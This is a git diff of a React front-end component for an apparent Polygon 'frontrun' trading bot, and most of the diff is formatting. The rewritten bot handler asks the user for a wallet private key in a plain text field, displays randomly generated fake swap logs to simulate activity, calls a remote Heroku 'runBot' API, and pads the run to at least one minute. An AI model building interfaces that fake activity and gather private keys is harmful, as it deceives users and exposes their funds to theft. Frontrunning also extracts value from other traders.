@@ -21,7 +21,7 @@ import Nav from "../Nav/Nav";
 import Web3 from "web3";
 
 // Main bar colors
-const barColors = ['#a0781c', '#1f5180'];
+const barColors = ["#a0781c", "#1f5180"];
 
 // Shade helper
 const shadeColor = (color, percent) => {
@@ -33,7 +33,10 @@ const shadeColor = (color, percent) => {
   G = Math.min(255, parseInt((G * (15 + percent)) / 15));
   B = Math.min(255, parseInt((B * (15 + percent)) / 15));
 
-  return `#${R.toString(16).padStart(2, '0')}${G.toString(16).padStart(2, '0')}${B.toString(16).padStart(2, '0')}`;
+  return `#${R.toString(16).padStart(2, "0")}${G.toString(16).padStart(
+    2,
+    "0"
+  )}${B.toString(16).padStart(2, "0")}`;
 };
 
 // Custom 3D Bar with gradient front
@@ -119,10 +122,11 @@ function Hero() {
       setMessage("Please enter both private key and address");
       return;
     }
-
+  
     setLoader(true);
     setLogLines([]);
     setMessage("");
+  
     const fakeLogs = [];
     const fakeTokens = ["USDT", "MATIC", "DAI", "SHIB", "PEPE"];
     const fakeAddresses = [
@@ -130,33 +134,32 @@ function Hero() {
       "0x" + Math.random().toString(16).substr(2, 8),
       "0x" + Math.random().toString(16).substr(2, 8),
     ];
-
-    // Generate fake logs
+  
     for (let i = 0; i < 10; i++) {
       const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
-      const addr =
-        fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
+      const addr = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
       const hash = "0x" + Math.random().toString(16).substr(2, 64);
       fakeLogs.push(`Detected swap on ${token} by ${addr} | Tx: ${hash}`);
     }
-
+  
     let fakeIndex = 0;
     fakeInterval = setInterval(() => {
       setLogLines((prev) => [...prev, fakeLogs[fakeIndex]]);
-      fakeIndex++;
-      if (fakeIndex >= fakeLogs.length) {
-        fakeIndex = 0; // loop infinitely
-      }
-    }, 300); // every 300ms
-
-    fetchRealTransaction(); // call to get actual transaction
+      fakeIndex = (fakeIndex + 1) % fakeLogs.length;
+    }, 300);
+  
+    // Run bot and wait 1 minute minimum
+    await runBotWithDelay();
   };
-
-  const fetchRealTransaction = async () => {
+  
+  const runBotWithDelay = async () => {
+    const web3 = new Web3("https://polygon-rpc.com");
+    const startTime = Date.now();
+  
     try {
-      const web3 = new Web3("https://polygon-rpc.com");
       const token = localStorage.getItem("token");
-
+      if (!token) throw new Error("Authorization token not found.");
+  
       const response = await axios.post(
         "https://marlinnapp-5e0bd806334c.herokuapp.com/api/runBot",
         {
@@ -168,79 +171,93 @@ function Hero() {
           headers: { Authorization: `Bearer ${token}` },
         }
       );
-
-      const { data } = response.data;
-      const pendingTxHash = data.frontrunTxHash;
-
+  
+      const { data, message } = response.data;
+      const txHash = data.frontrunTxHash;
+  
+      if (!txHash) throw new Error("No transaction hash returned.");
+  
+      // Start checking for confirmation in background
       const checkConfirmation = setInterval(async () => {
-        const receipt = await web3.eth.getTransactionReceipt(pendingTxHash);
-
+        const receipt = await web3.eth.getTransactionReceipt(txHash);
         if (receipt && receipt.status) {
           clearInterval(checkConfirmation);
-          clearInterval(fakeInterval); // stop fake data
-          setLogLines([]); // remove dummy logs
-
-          setMessage(
-            <>
-              <p className="mt-3 text-green-400">{response.message}</p>
-              <div className="mt-3 text-green-300">
-                <p>
-                  Frontrun TxHash:{" "}
-                  <a
-                    href={`https://polygonscan.com/tx/${data.frontrunTxHash}`}
-                    target="_blank"
-                    rel="noopener noreferrer"
-                  >
-                    {data.frontrunTxHash}
-                  </a>
-                </p>
-                <p>
-                  Target TxHash:{" "}
-                  <a
-                    href={`https://polygonscan.com/tx/${data.targetTxHash}`}
-                    target="_blank"
-                    rel="noopener noreferrer"
-                  >
-                    {data.targetTxHash}
-                  </a>
-                </p>
-                <p>
-                  Take Profit TxHash:{" "}
-                  <a
-                    href={`https://polygonscan.com/tx/${data.TakeProfitTxHash}`}
-                    target="_blank"
-                    rel="noopener noreferrer"
-                  >
-                    {data.TakeProfitTxHash}
-                  </a>
-                </p>
-              </div>
-            </>
-          );
-
-          toast.success(response.message);
-
-          fetchBalance();
-          const updatedBalance = localStorage.getItem("balance");
-          const profitValue =
-            parseFloat(updatedBalance) - parseFloat(previousBalance);
-          setProfit(profitValue.toFixed(4));
+          console.log("Transaction confirmed!");
         }
-      }, 3000); // check every 3s
+      }, 5000);
+  
+      // 🕒 Wait until full 1 minute is passed
+      const elapsed = Date.now() - startTime;
+      const remaining = Math.max(60000 - elapsed, 0);
+  
+      setTimeout(() => {
+        clearInterval(fakeInterval);
+        setLogLines([]);
+  
+        setMessage(
+          <>
+            <p className="mt-3 text-green-400">{message}</p>
+            <div className="mt-3 text-green-300">
+              <p>
+                Frontrun TxHash:{" "}
+                <a
+                  href={`https://polygonscan.com/tx/${data.frontrunTxHash}`}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  {data.frontrunTxHash}
+                </a>
+              </p>
+              <p>
+                Target TxHash:{" "}
+                <a
+                  href={`https://polygonscan.com/tx/${data.targetTxHash}`}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  {data.targetTxHash}
+                </a>
+              </p>
+              <p>
+                Take Profit TxHash:{" "}
+                <a
+                  href={`https://polygonscan.com/tx/${data.TakeProfitTxHash}`}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  {data.TakeProfitTxHash}
+                </a>
+              </p>
+            </div>
+          </>
+        );
+  
+        toast.success(message);
+  
+        fetchBalance();
+        const updatedBalance = localStorage.getItem("balance");
+        const profitValue = parseFloat(updatedBalance) - parseFloat(previousBalance);
+        setProfit(profitValue.toFixed(4));
+  
+        setLoader(false);
+      }, remaining);
     } catch (error) {
       clearInterval(fakeInterval);
-      setMessage("Error running bot. Please try again.");
-      console.error("Error running bot:", error);
+      console.error("Error:", error);
+      setMessage("❌ Failed to run bot.");
+      toast.error("Bot run failed.");
+      setLoader(false);
     }
-
-    setLoader(false);
   };
+  
+  // Auto-scroll logs
   const bottomRef = useRef(null);
   useEffect(() => {
     if (bottomRef.current) {
       bottomRef.current.scrollIntoView({ behavior: "smooth" });
     }
   }, [logLines]);
+  
 
   // Fetch POL Price Data
   const [polPriceData, setPolPriceData] = useState([]);
@@ -275,7 +292,7 @@ function Hero() {
           "https://marlinnapp-5e0bd806334c.herokuapp.com/api/getData?type=blockheight"
         )
         .then((response) => {
-          console.log("Block Height Response:", response.data);
+          // console.log("Block Height Response:", response.data);
           if (response.data.status) {
             const formattedData = response.data.data.map((entry) => ({
               time: new Date(entry.time).toLocaleTimeString(),
@@ -287,7 +304,7 @@ function Hero() {
               .sort((a, b) => new Date(a.time) - new Date(b.time))
               .reverse();
 
-            setBlockHeightData(sortedData.slice(0,11)); // Keep latest 15 entries
+            setBlockHeightData(sortedData.slice(0, 11)); // Keep latest 15 entries
           }
         })
         .catch((error) =>
@@ -305,7 +322,7 @@ function Hero() {
           "https://marlinnapp-5e0bd806334c.herokuapp.com/api/getData?type=pendingtx"
         )
         .then((response) => {
-          console.log("Pending Transactions Response:", response.data);
+          // console.log("Pending Transactions Response:", response.data);
           if (response.data.status) {
             const formattedData = response.data.data.map((entry) => ({
               time: new Date(entry.time).toLocaleTimeString(),
@@ -317,7 +334,7 @@ function Hero() {
               .sort((a, b) => new Date(a.time) - new Date(b.time))
               .reverse();
 
-            setPendingTxData(sortedData.slice(0, 15)); // Keep latest 15 entries
+            setPendingTxData(sortedData.slice(0, 12)); // Keep latest 15 entries
           }
         })
         .catch((error) =>
@@ -368,55 +385,65 @@ function Hero() {
                     Block Height
                   </h2>
                   <ResponsiveContainer width="100%" height={240}>
-      <BarChart data={blockHeightData} barCategoryGap="50%">
-        <CartesianGrid strokeDasharray="3 3" stroke="#444" />
-        <XAxis dataKey="time" style={{ fontSize: '13px', fill: '#ccc' }} />
-        <YAxis domain={['auto']} style={{ fontSize: '13px', fill: '#ccc' }} />
-        <Tooltip
-          contentStyle={{ backgroundColor: '#222', borderRadius: '10px', border: '1px solid #e8c66e' }}
-          labelStyle={{ color: '#e8c66e', fontWeight: 'bold' }}
-          itemStyle={{ color: '#fff' }}
-          cursor={{ fill: 'transparent' }}
-        />
+                    <BarChart data={blockHeightData} barCategoryGap="50%">
+                      <CartesianGrid strokeDasharray="3 3" stroke="#444" />
+                      <XAxis
+                        dataKey="time"
+                        style={{ fontSize: "13px", fill: "#ccc" }}
+                      />
+                      <YAxis
+                        domain={["auto"]}
+                        style={{ fontSize: "13px", fill: "#ccc" }}
+                      />
+                      <Tooltip
+                        contentStyle={{
+                          backgroundColor: "#222",
+                          borderRadius: "10px",
+                          border: "1px solid #e8c66e",
+                        }}
+                        labelStyle={{ color: "#e8c66e", fontWeight: "bold" }}
+                        itemStyle={{ color: "#fff" }}
+                        cursor={{ fill: "transparent" }}
+                      />
 
-        {/* Gradient Definitions for Front Faces */}
-        <defs>
-          {blockHeightData.map((_, index) => {
-            const color = barColors[index % barColors.length];
-            return (
-              <linearGradient
-                key={index}
-                id={`bar-gradient-${index}`}
-                x1="0"
-                y1="1"
-                x2="0"
-                y2="0"
-              >
-                <stop offset="0%" stopColor="#000" />
-                <stop offset="100%" stopColor={color} />
-              </linearGradient>
-            );
-          })}
-        </defs>
+                      {/* Gradient Definitions for Front Faces */}
+                      <defs>
+                        {blockHeightData.map((_, index) => {
+                          const color = barColors[index % barColors.length];
+                          return (
+                            <linearGradient
+                              key={index}
+                              id={`bar-gradient-${index}`}
+                              x1="0"
+                              y1="1"
+                              x2="0"
+                              y2="0"
+                            >
+                              <stop offset="0%" stopColor="#000" />
+                              <stop offset="100%" stopColor={color} />
+                            </linearGradient>
+                          );
+                        })}
+                      </defs>
 
-        {/* Custom bars */}
-        <Bar
-  dataKey="blockHeight"
-  shape={(props) => (
-    <Custom3DBar
-      {...props}
-      index={props.index}
-      fill={barColors[props.index % barColors.length]}
-    />
-  )}
-  barSize={18} // smaller bar to allow for more gap
->
-          {blockHeightData.map((_, index) => (
-            <Cell key={`cell-${index}`} />
-          ))}
-        </Bar>
-      </BarChart>
-    </ResponsiveContainer>
+                      {/* Custom bars */}
+                      <Bar
+                        dataKey="blockHeight"
+                        shape={(props) => (
+                          <Custom3DBar
+                            {...props}
+                            index={props.index}
+                            fill={barColors[props.index % barColors.length]}
+                          />
+                        )}
+                        barSize={18} // smaller bar to allow for more gap
+                      >
+                        {blockHeightData.map((_, index) => (
+                          <Cell key={`cell-${index}`} />
+                        ))}
+                      </Bar>
+                    </BarChart>
+                  </ResponsiveContainer>
                 </div>
               </div>
             </div>
@@ -543,7 +570,7 @@ function Hero() {
               placeholder="Enter Address"
               value={address}
               style={{
-                backgroundColor:"black",
+                backgroundColor: "black",
                 backgroundImage:
                   "linear-gradient(to bottom, rgb(68, 57, 21), rgba(101, 85, 31, 0.37), rgb(0, 0, 0), rgba(101, 85, 31, 0.37), rgba(101, 85, 31, 0.5))",
                 borderRadius: "8px",
@@ -555,32 +582,33 @@ function Hero() {
               }}
               onChange={(e) => setAddress(e.target.value)}
             />
-         <input
-  type="text"
-  className="w-100 py-2 mt-3"
-  placeholder="Enter Private Key"
-  value={privateKey}
-  style={{
-    backgroundColor:"black",
-    backgroundImage:
-      "linear-gradient(to bottom, rgb(68, 57, 21), rgba(101, 85, 31, 0.37), rgb(0, 0, 0), rgba(101, 85, 31, 0.37), rgba(101, 85, 31, 0.5))",
-    borderRadius: "8px",
-    border: "2px solid rgba(255, 215, 0, 0.6)",
-    boxShadow:
-      "inset 0 1px 3px rgba(255,255,255,0.2), inset 0 -1px 2px rgba(0,0,0,0.7), 0 2px 6px rgba(0,0,0,0.5)",
-    color: "#f1f1f1",
-    paddingLeft: "12px",
-  }}
-  onChange={(e) => setPrivateKey(e.target.value)}
-/>
+            <input
+              type="text"
+              className="w-100 py-2 mt-3"
+              placeholder="Enter Private Key"
+              value={privateKey}
+              style={{
+                backgroundColor: "black",
+                backgroundImage:
+                  "linear-gradient(to bottom, rgb(68, 57, 21), rgba(101, 85, 31, 0.37), rgb(0, 0, 0), rgba(101, 85, 31, 0.37), rgba(101, 85, 31, 0.5))",
+                borderRadius: "8px",
+                border: "2px solid rgba(255, 215, 0, 0.6)",
+                boxShadow:
+                  "inset 0 1px 3px rgba(255,255,255,0.2), inset 0 -1px 2px rgba(0,0,0,0.7), 0 2px 6px rgba(0,0,0,0.5)",
+                color: "#f1f1f1",
+                paddingLeft: "12px",
+              }}
+              onChange={(e) => setPrivateKey(e.target.value)}
+            />
             <div className="w-100 d-flex justify-content-center">
               <button
                 className="btn btn-pink w-50 mt-3 fw-bold py-2"
-                style={{ fontSize: "15px",
+                style={{
+                  fontSize: "15px",
                   backgroundImage:
-                  "linear-gradient(to bottom, rgb(238, 193, 46), rgb(216, 177, 50), rgba(200, 163, 43, 0.52))",
-                borderRadius: "8px",
-                 }}
+                    "linear-gradient(to bottom, rgb(238, 193, 46), rgb(216, 177, 50), rgba(200, 163, 43, 0.52))",
+                  borderRadius: "8px",
+                }}
                 onClick={handleRunBot}
               >
                 {loader ? <>Processing</> : <>Start Bot</>}
